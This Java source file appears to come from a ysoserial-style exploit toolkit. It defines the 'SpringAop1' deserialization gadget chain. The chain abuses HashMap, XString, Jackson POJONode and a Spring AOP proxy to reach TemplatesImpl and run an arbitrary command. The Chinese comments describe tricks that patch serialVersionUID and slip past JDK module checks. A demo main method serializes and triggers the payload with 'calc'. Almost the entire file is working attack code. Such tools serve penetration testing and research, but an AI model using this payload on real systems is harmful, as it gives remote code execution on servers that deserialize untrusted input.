package cn.butler.yso.payloads;

import cn.butler.hessian.util.JDKUtil;
import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.yso.Deserializer;
import cn.butler.yso.JavassistClassLoader;
import cn.butler.yso.Serializer;
import cn.butler.yso.payloads.util.Gadgets;
import cn.butler.yso.payloads.util.Reflections;
import javassist.*;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.HashMap;

/**
 *org.springframework.aop.framework.DefaultAdvisorChainFactory:    private static final long serialVersionUID = 273003553246259276L;
 *
 * Hashmap#readobject
 * 	XString#equals
 * 			com.fasterxml.jackson.databind.node.POJONode#toString
 * 				---利用SpringAOP动态代理Proxy方式稳定触发TemplatesImpl的Get方法---
 * 				(Proxy)java.lang.reflect.Proxy---(InvocationHandler)org.springframework.aop.framework.JdkDynamicAopProxy#invoke
 * 				com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2", "org.springframework:spring-aop:4.1.4.RELEASE"})
@Authors({ Authors.B0T1ER })
public class SpringAop1 extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createGetter(command);

        ClassPool pool = ClassPool.getDefault();

        //修改org.springframework.aop.framework.DefaultAdvisorChainFactory类的suid值
        pool.insertClassPath(new ClassClassPath(Class.forName("org.springframework.aop.framework.DefaultAdvisorChainFactory")));
        final CtClass defaultAdvisorChainFactoryCtClass = pool.get("org.springframework.aop.framework.DefaultAdvisorChainFactory");
        try {
            CtField ctSUID = defaultAdvisorChainFactoryCtClass.getDeclaredField("serialVersionUID");
            defaultAdvisorChainFactoryCtClass.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        defaultAdvisorChainFactoryCtClass.addField(CtField.make("private static final long serialVersionUID = 273003553246259276L;", defaultAdvisorChainFactoryCtClass));

        //使用AdvisedSupport代理TemplatesImpl绕过高版本jdk的模块化检测
        Class<?> jdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Class<?> advisedSupportClass = Class.forName("org.springframework.aop.framework.AdvisedSupport");
        Constructor<?> constructor = jdkDynamicAopProxyClass.getConstructor(advisedSupportClass);
        constructor.setAccessible(true);
        Object advisedSupport = advisedSupportClass.newInstance();

        //替换旧的DefaultAdvisorChainFactory对象
        final Object defaultAdvisorChainFactory1 = defaultAdvisorChainFactoryCtClass.toClass(new JavassistClassLoader()).newInstance();
        defaultAdvisorChainFactoryCtClass.defrost();
        Reflections.setFieldValue(advisedSupport, "advisorChainFactory", defaultAdvisorChainFactory1);

        Method setTarget = advisedSupport.getClass().getMethod("setTarget", Object.class);
        setTarget.invoke(advisedSupport, templates);
        InvocationHandler invocationHandler = (InvocationHandler)constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),new Class[] {Templates.class},(InvocationHandler)invocationHandler);


        //重构置空BaseJsonNode#writeReplace避免在序列化时候触发
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        if (!ctClass0.isFrozen()) {
            CtMethod ctMethod = ctClass0.getDeclaredMethod("writeReplace");
            ctClass0.removeMethod(ctMethod);
            ctClass0.freeze();
            ctClass0.toClass();
        }
        //POJONode触发TemplatesImpl#getOutputProperties方法
        Class<?> pOJONodeClass = Class.forName("com.fasterxml.jackson.databind.node.POJONode");
        Constructor<?> constructor1 = pOJONodeClass.getConstructor(Object.class);
        Object pOJONode = constructor1.newInstance(proxy);

        //XString方式触发POJONode#toString方法
        Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
        Object xstring = Reflections.createWithoutConstructor(aClass1);
        Reflections.setFieldValue(xstring,"m_obj",new char[]{});
        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap1.put("通话",xstring);
        hashMap1.put("重地",pOJONode);
        hashMap2.put("重地",xstring);
        hashMap2.put("通话",pOJONode);
        HashMap<Object, Object> map = JDKUtil.makeMap(hashMap1, hashMap2);
        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(templates);
        arrayList.add(proxy);
        arrayList.add(map);

        return arrayList;
    }

    public static void main(String[] args) throws Exception {
       Object object = new SpringAop1().getObject("Templateslmpl0:auto_cmd:calc");
       byte[] serialize = Serializer.serialize(object);
       Deserializer.deserialize(serialize);
    }
}
